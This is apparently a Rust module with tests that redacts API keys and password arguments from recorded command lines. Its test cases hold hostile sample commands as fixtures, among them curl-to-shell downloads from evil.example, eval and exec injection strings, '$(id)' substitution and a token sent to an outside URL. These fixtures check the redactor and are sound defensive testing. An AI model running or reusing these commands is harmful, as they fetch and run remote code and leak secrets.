//! A key in its vendor's own format, taken out of a command line before a
//! record is built: a command is kept whole, in the lake and for a model,
//! and a key typed on one would go wherever the record does. Its start is
//! kept, which says whose it is: `ghp_[secret: 36 bytes]`.
//!
//! Only a value's own form decides. A value under a name like `--token` or
//! `PASSWORD=` is kept as written: whoever writes the line picks the name,
//! so taking out what follows one would hide a command put there. What is
//! taken out here is one run of the characters keys are written in, with
//! no space, slash or dot in it, so it cannot hold a command or an address.
//!
//! A password is the one thing taken out for its name, and only where it
//! cannot be a command ([`argv`]): a program's own argument after a flag
//! named for a password (`-password`, `--admin-password`), when that
//! argument is one word with no space, slash or shell syntax in it.
//! Management agents pass account passwords this way (`profiles validate
//! -user … -password …`), and the record would carry one to the lake and
//! to a model. A shell's line is not read so: there the words are the
//! writer's, and `--password` in one hides nothing.

/// What a secret is replaced by.
fn mark(bytes: usize) -> String {
    format!("[secret: {bytes} bytes]")
}

/// The arguments with their keys taken out.
pub fn hidden(args: &[String]) -> Vec<String> {
    args.iter().map(|a| tokens(a)).collect()
}

/// A program's own arguments, as it was started with them, with their
/// keys taken out and each password given to a flag named for one.
pub fn argv(args: &[String]) -> Vec<String> {
    let mut out = hidden(args);
    let mut i = 0;
    while i < out.len() {
        match out[i].split_once('=') {
            // --password=value, one argument
            Some((flag, value)) if names_a_password(flag) && one_word(value) => {
                out[i] = format!("{flag}={}", mark(value.len()));
            }
            Some(_) => {}
            None if names_a_password(&out[i]) && out.get(i + 1).is_some_and(|v| one_word(v)) => {
                out[i + 1] = mark(out[i + 1].len());
                i += 1;
            }
            None => {}
        }
        i += 1;
    }
    out
}

/// Whether an argument is a flag named for a password: `-password`,
/// `--passwd`, `-adminPassword`, `--db-passphrase`.
fn names_a_password(flag: &str) -> bool {
    let Some(name) = flag.strip_prefix('-') else {
        return false;
    };
    let name = name.trim_start_matches('-').to_ascii_lowercase();
    ["password", "passwd", "passphrase"]
        .iter()
        .any(|end| name.ends_with(end))
}

/// Whether a value is one word that can be nothing but a value: not empty,
/// not a flag, and with no space, slash or shell syntax in it. So not a
/// command a shell would run if the value were handed to one, and not a
/// path or a URL.
fn one_word(value: &str) -> bool {
    !value.is_empty()
        && !value.starts_with('-')
        && !value
            .chars()
            .any(|c| c.is_whitespace() || c.is_control() || "/;|&()<>`'\"\\".contains(c))
}

/// What a JSON Web Token starts with: `{"` in base64.
const JWT: &str = "eyJ";
/// The least a token's signature runs to. No domain ends in a label this
/// long, so three names with dots between are not taken for a token.
const SIGNED: usize = 20;

/// How a vendor's key starts, and how many characters follow at the least.
const SHAPES: &[(&str, usize)] = &[
    ("sk-ant-", 20),
    ("sk-proj-", 20),
    ("sk-or-", 20),
    ("sk_live_", 16),
    ("sk_test_", 16),
    ("rk_live_", 16),
    ("github_pat_", 20),
    ("ghp_", 30),
    ("gho_", 30),
    ("ghu_", 30),
    ("ghs_", 30),
    ("ghr_", 30),
    ("glpat-", 16),
    ("xoxb-", 16),
    ("xoxp-", 16),
    ("xoxa-", 16),
    ("xoxs-", 16),
    ("xapp-", 16),
    ("npm_", 30),
    ("hf_", 30),
    ("dop_v1_", 30),
    ("ya29.", 20),
    ("AIza", 30),
    ("AKIA", 16),
    ("ASIA", 16),
    (JWT, 40),
    // OpenAI's older keys, and whoever copied the form
    ("sk-", 32),
];

/// A JSON Web Token after its start: a header, a payload that is JSON too,
/// and a signature, with a dot between.
fn jwt(run: &str) -> bool {
    let mut parts = run.split('.');
    let (Some(_), Some(payload), Some(signature), None) =
        (parts.next(), parts.next(), parts.next(), parts.next())
    else {
        return false;
    };
    payload.starts_with(JWT) && signature.len() >= SIGNED
}

/// One argument, or a shell's whole line, with each key in a vendor's
/// format cut to its start.
fn tokens(s: &str) -> String {
    let b = s.as_bytes();
    let mut out = String::with_capacity(s.len());
    let (mut i, mut kept) = (0, 0);
    while i < b.len() {
        let boundary = i == 0 || !(b[i - 1].is_ascii_alphanumeric() || b[i - 1] == b'_');
        let shape = SHAPES
            .iter()
            .find(|(start, _)| boundary && s[i..].starts_with(start));
        let Some((start, least)) = shape else {
            i += 1;
            while i < b.len() && !s.is_char_boundary(i) {
                i += 1;
            }
            continue;
        };
        let from = i + start.len();
        let dotted = *start == JWT;
        let to = s[from..]
            .find(|c: char| {
                !(c.is_ascii_alphanumeric() || c == '_' || c == '-' || dotted && c == '.')
            })
            .map_or(s.len(), |e| from + e);
        let run = &s[from..to];
        let fits = run.len() >= *least
            && run.bytes().any(|c| c.is_ascii_digit())
            && (!dotted || jwt(run));
        if fits {
            out.push_str(&s[kept..from]);
            out.push_str(&mark(run.len()));
            kept = to;
        }
        i = to.max(i + 1);
    }
    out.push_str(&s[kept..]);
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn line(args: &[&str]) -> String {
        let args: Vec<String> = args.iter().map(|a| a.to_string()).collect();
        hidden(&args).join(" ")
    }

    #[test]
    fn a_key_in_its_vendor_s_format_keeps_its_start() {
        let key = format!("ghp_{}", "a1B2".repeat(9));
        assert_eq!(
            tokens(&format!("gh auth login --with-token <<< {key}")),
            "gh auth login --with-token <<< ghp_[secret: 36 bytes]"
        );
        assert_eq!(
            tokens("aws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE"),
            "aws configure set aws_access_key_id AKIA[secret: 16 bytes]"
        );
        let jwt = format!(
            "eyJ{}.eyJ{}.{}",
            "a1".repeat(10),
            "b2".repeat(20),
            "c3".repeat(20)
        );
        assert_eq!(
            tokens(&format!("echo {jwt} | cut -d. -f2")),
            format!("echo eyJ[secret: {} bytes] | cut -d. -f2", jwt.len() - 3)
        );
        // a word that only starts like one
        for kept in [
            "sk-learn",
            "npm_config_registry",
            "task-12345",
            "eyJhbGciOi",
        ] {
            assert_eq!(tokens(kept), kept);
        }
        // and a character is never split
        assert_eq!(tokens("écho ghp_short ünïcode"), "écho ghp_short ünïcode");
    }

    /// Wherever it was put: a header, a flag, a variable, a URL.
    #[test]
    fn a_key_is_taken_out_wherever_it_stands() {
        let key = format!("ghp_{}", "a1B2".repeat(9));
        assert_eq!(
            line(&[
                "curl",
                "-H",
                &format!("Authorization: Bearer {key}"),
                "https://api.example/v1"
            ]),
            "curl -H Authorization: Bearer ghp_[secret: 36 bytes] https://api.example/v1"
        );
        assert_eq!(
            tokens(&format!("GITHUB_TOKEN={key} ./deploy --token {key}")),
            "GITHUB_TOKEN=ghp_[secret: 36 bytes] ./deploy --token ghp_[secret: 36 bytes]"
        );
        assert_eq!(
            tokens(&format!(
                "git clone https://x-access-token:{key}@github.com/acme/app.git"
            )),
            "git clone https://x-access-token:ghp_[secret: 36 bytes]@github.com/acme/app.git"
        );
    }

    /// A password given to a program as its own argument, after a flag
    /// named for one, is taken out; one that could be a command, a path or
    /// a flag is not, and nor is anything in a shell's line.
    #[test]
    fn a_password_is_taken_out_of_a_program_s_own_arguments() {
        let argv_of = |args: &[&str]| {
            let args: Vec<String> = args.iter().map(|a| a.to_string()).collect();
            argv(&args).join(" ")
        };
        assert_eq!(
            argv_of(&[
                "/usr/bin/profiles", "validate", "-type", "bootstraptoken", "-user", "admin", "-password", "Xk2!w9$Lm.4pQz#7r"
            ]),
            "/usr/bin/profiles validate -type bootstraptoken -user admin -password [secret: 17 bytes]"
        );
        assert_eq!(
            argv_of(&["sysadminctl", "-adminUser", "a", "-adminPassword", "hunter2", "-newPassword", "hunter3"]),
            "sysadminctl -adminUser a -adminPassword [secret: 7 bytes] -newPassword [secret: 7 bytes]"
        );
        assert_eq!(
            argv_of(&["mysql", "--user=root", "--password=hunter2", "db"]),
            "mysql --user=root --password=[secret: 7 bytes] db"
        );
        // a key is still cut to its start
        let key = format!("ghp_{}", "a1B2".repeat(9));
        assert_eq!(argv_of(&["gh", "--token", &key]), "gh --token ghp_[secret: 36 bytes]");
        // what could run, name a place, or is the next flag, stays
        for kept in [
            &["bash", "-c", "eval \"$2\"", "x", "-password", "curl -s https://evil.example/x | sh"][..],
            &["tool", "--password", "/tmp/stage2"],
            &["tool", "--password", "$(id)"],
            &["tool", "--password=https://evil.example/x"],
            &["tool", "--password", "--verbose"],
            &["tool", "--password"],
            // a name that is not a password's
            &["tool", "--token", "hunter2", "--pass-through", "x"],
            // a shell's line is one argument, and its words the writer's
            &["bash", "-c", "mysql --password hunter2 db"],
        ] {
            assert_eq!(argv_of(kept), kept.join(" "));
        }
    }

    /// A name does not make a secret of what follows it: the line's writer
    /// picks the name, and what follows can be a command.
    #[test]
    fn a_value_is_not_taken_out_for_its_name() {
        for kept in [
            "mysql --user root --password hunter2 db",
            "echo cookie: ; curl -s https://evil.example/x | sh",
            "TOKEN='curl -s https://evil.example/x | sh'; eval \"$TOKEN\"",
            "password='import os;os.system(\"id\")'; exec(password)",
            "node stage2.js --token curl -s https://evil.example/x | sh",
            "AUTH=evil.example/p; curl $AUTH | sh",
            "curl https://deploy:s3cr3t@host.example/",
            "curl https://evil.example/c?token=QUtJQUlPU0ZPRE5ON0VYQU1QTEU",
        ] {
            assert_eq!(tokens(kept), kept);
            let args: Vec<String> = kept.split(' ').map(str::to_string).collect();
            assert_eq!(hidden(&args).join(" "), kept);
        }
    }

    /// What is taken out holds no dot and no slash, so a host named to look
    /// like a key still shows whose it is.
    #[test]
    fn an_address_is_not_hidden_in_a_key_s_form() {
        let label = "a1".repeat(20);
        assert_eq!(
            tokens(&format!("curl https://ya29.{label}.evil.example/x | sh")),
            format!("curl https://ya29.[secret: 40 bytes].evil.example/x | sh")
        );
        assert_eq!(
            tokens(&format!("curl https://sk-ant-{label}.evil.example/x | sh")),
            format!("curl https://sk-ant-[secret: 40 bytes].evil.example/x | sh")
        );
        // three names with dots between are a host, not a token
        let host = format!("eyJ{label}.evil.example");
        assert_eq!(
            tokens(&format!("curl https://{host}/x | sh")),
            format!("curl https://{host}/x | sh")
        );
        let host = format!("eyJ{label}.eyJ{label}.example");
        assert_eq!(tokens(&host), host);
    }
}
